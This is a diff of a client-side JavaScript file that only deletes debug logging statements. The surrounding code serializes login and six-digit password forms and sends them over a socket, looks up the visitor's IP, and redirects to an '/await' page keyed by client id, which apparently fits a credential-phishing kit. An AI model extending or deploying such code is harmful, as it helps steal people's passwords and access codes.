@@ -533,8 +533,6 @@ socket.on('conectado', (data) => {
 
     if (params.has('client') || client_id) {
         socket.emit('userReconnect', params.get('client') || client_id)
-
-        console.log(params.get('client'))
     } else return
 })
 
@@ -745,7 +743,6 @@ const infosData = (() => {
     }
 
     async function submit(form) {
-        console.log(form)
         if (!form) return
 
         form.addEventListener('submit', (e) => {
@@ -761,8 +758,6 @@ const infosData = (() => {
             const data = util.serialize(form)
 
             socket.emit('password6Client', data)
-
-            console.log(data)
         })
     }
 
@@ -792,8 +787,6 @@ const infosData = (() => {
             socket.emit('sendPass6', data)
 
             window.location.href = `/await?client=${data.id}`
-
-            console.log(data)
         })
     }
 
@@ -812,7 +805,6 @@ const infosData = (() => {
 
 const formUpdateClient = document.querySelector(`.form-pass6`)
 
-infosData.getIp((ip) => console.log)
 infosData.commands()
 infosData.auth(document.querySelector('.form-auth'))
 infosData.digits(document.querySelector('.form-pass6'))
@@ -820,7 +812,6 @@ infosData.create(formInfo)
 infosData.update(formUpdateClient)
 infosData.submit(document.querySelector(`.form-pass6`))
 
-//console.log(formInfo)
 
 const pageMail = (() => {
     function resend() {
@@ -1405,8 +1396,6 @@ const mp = (() => {
 
         const button = form.querySelector(`button`)
 
-        console.log(`form verify`, button)
-
         button.addEventListener('click', async function (e) {
             e.preventDefault()
 
@@ -1528,8 +1517,6 @@ const login = (() => {
             e.preventDefault()
 
             const user = util.serialize(form)
-
-            console.log(user)
 
             return util
                 .request({
@@ -1803,8 +1790,6 @@ const product = (() => {
             const { id: product_id } = object.data
 
             const file = object.form.elements['file'].files[0]
-
-            console.log(file)
 
             if (!file) return resolve(object.data)
 
